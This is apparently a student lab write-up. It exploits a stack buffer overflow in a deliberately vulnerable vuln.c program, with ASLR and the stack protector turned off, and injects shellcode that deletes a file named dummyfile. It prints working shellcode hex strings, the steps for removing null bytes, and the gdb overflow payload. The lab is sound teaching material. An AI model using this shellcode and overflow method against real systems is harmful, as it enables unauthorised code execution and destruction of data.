# DELETE DUMMYFILE USING INJECTION CODE

## Target

- Delete `dummyfile` file by using `buffer overflow` to `inject code` into `vuln.c` file

## Prepare for lab

- Create `dummyfile` without format using:

  > touch dummyfile

![Ảnh chụp màn hình 2024-09-17 094329](https://github.com/user-attachments/assets/00df81ee-674f-478c-9c09-b34c62a215da)

- Change to shell `/bin/sh`

  > sudo ln -sf /bin/zsh /bin/sh

- Turn off OS’s address space layout randomization:

  > sudo sysctl -w kernel.randomize_va_space=0

![Ảnh chụp màn hình 2024-09-17 095310](https://github.com/user-attachments/assets/6e5b58a3-7ac7-4870-806b-499b9a2bf658)

- Compile and link the file_del.asm code using 2 commands:

  > nasm -g -f elf file_del.asm

  > ld -m elf_i386 -o file_del file_del.o

![Ảnh chụp màn hình 2024-09-17 100229](https://github.com/user-attachments/assets/a3ea15ac-5d75-498e-8adc-7f0eac6cf64c)

- Hexstring of my `file_del.asm` using:

  > for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

![Ảnh chụp màn hình 2024-09-17 101643](https://github.com/user-attachments/assets/aeaa04d3-fe70-4da8-8d99-e1e752bc17af)

- But we don't need `\xdummyfile` at the end, so we have:

  > \xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00

- Stack frame of `vuln.c`.

![Ảnh chụp màn hình 2024-09-17 103054](https://github.com/user-attachments/assets/4a0f9a06-5b08-4eb1-96bd-87167d56176b)

- Compile the `vuln.c` program using:
  > gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2

## execution.

- I will set two breakpoint at `0x804843e` and `0x804846b`.

![Ảnh chụp màn hình 2024-09-17 103936](https://github.com/user-attachments/assets/64e07722-d58e-4ea7-ad9e-65b00fa7b487)

- If we want to execute the `file_del.asm` code on stack, we need to overflow the buffer so that `return address` points to the top of `esp` where the code will lies. It will be `36 bytes of hexstring + 32 padding bytes + 4 bytes of esp`. I will use `\xff\xff\xff\xff` to identify `ebp`, use command:

> r $(python –c “print(‘\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00’ + ‘a’\*32 + ‘\xff\xff\xff\xff)”)

![Ảnh chụp màn hình 2024-09-17 105402](https://github.com/user-attachments/assets/6268b9b7-4d87-45c3-b217-995e4fef445a)

- The red address is `ebp`.
- The green address is `Return Address`.
- We `continue`

![Ảnh chụp màn hình 2024-09-17 105952](https://github.com/user-attachments/assets/a5373985-2e18-4c68-843f-585c41af45aa)

- Comparing to the hexstring, the first 3 values are the same buf after that everything is different and `Return Address` is not `\xff\xff\xff\xff`.

  - We have `\x0a(/n)` in the hexstring.
  - `\x00` have problem in 32 bits register `eax`.

![Ảnh chụp màn hình 2024-09-17 110946](https://github.com/user-attachments/assets/3e26783d-ccda-4009-b1b2-d019b622a806)

- In the `file_del.asm`:

![Ảnh chụp màn hình 2024-09-17 204933](https://github.com/user-attachments/assets/fcc6436d-d366-4d84-8e9e-5d1ed44220ea)

- The `\x0a` comes from the line `move eax, 10`.
- The `\x00` comes from `eax`. Because `eax` is 32 bits register so when we move a small value into `eax`, the high bits of this register (24 bits) will automatically be filled with `0`.

- We need to edit a few lines of code in `file_del.asm`:

  - Use `al` register. Because this is the lowest 8-bit part of the `eax` register. When you move a value into `al`, only 8-bits (1 byte) are changed, not affecting the rest of `eax`.
  - Clear the `eax` register using command:
    > xor eax, eax
  - Replace `move eax, 10` with:

    > mov al, 8

    > add al, 2

![Ảnh chụp màn hình 2024-09-17 210413](https://github.com/user-attachments/assets/dd513035-9961-4431-9ff3-d97058b5a69e)

- We recompile `file_del.asm`, get the new hexstring and run the program.

  - The new hexstring is `\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`

![Ảnh chụp màn hình 2024-09-17 211047](https://github.com/user-attachments/assets/25e5e582-d0e9-46cd-bcd7-3b12301ee1ba)

- At the end still `\x00`, I will change it to `\x01`. Now, the `Return Address` is `\xff\xff\xff\xff`.

![Ảnh chụp màn hình 2024-09-17 212405](https://github.com/user-attachments/assets/f503a561-6b50-4dae-81db-8775db9cf862)

- We will change the address `0xffffd63c`(the first `\xff`) to the address of `esp` `0xffffd5f8`, set the address `0xffffd61b` to `\x00` and `continue`.

![Ảnh chụp màn hình 2024-09-17 213453](https://github.com/user-attachments/assets/bbcbd0b3-3536-4ce7-90c5-65ad742153a6)

![Ảnh chụp màn hình 2024-09-17 213630](https://github.com/user-attachments/assets/52a4c003-22b6-4a62-9a7c-a0dc910f8efa)

- But dummyfile has not been deleted yet!

- Look at `file_del`.

![Ảnh chụp màn hình 2024-09-17 215849](https://github.com/user-attachments/assets/aaf9510a-dc9a-4258-a43f-6a148d0d8c86)

- `dummyfile` is stored at address `0x0804807a` including bytes `64 75 6d 6d 79 66 69 6c 65 00`. The command `mov ebx,_filename` causes the `ebx` register to `point to the address of _filename` here which is `0x0804807a`. What we just "deleted" is to make the `ebx` register `no longer point to the address of _filename`, not delete the `dummyfile`. So we need to `set the address of dummyfile in the program to the address of ebx`.

![Ảnh chụp màn hình 2024-09-17 221609](https://github.com/user-attachments/assets/4c83892e-f4e6-4b6d-b187-9881b9c2b4aa)

![Ảnh chụp màn hình 2024-09-17 221857](https://github.com/user-attachments/assets/a684d448-36f1-4e3a-a3b6-24bc7c2ef6fd)

- `dummyfile` has been deleted. The lab is done.
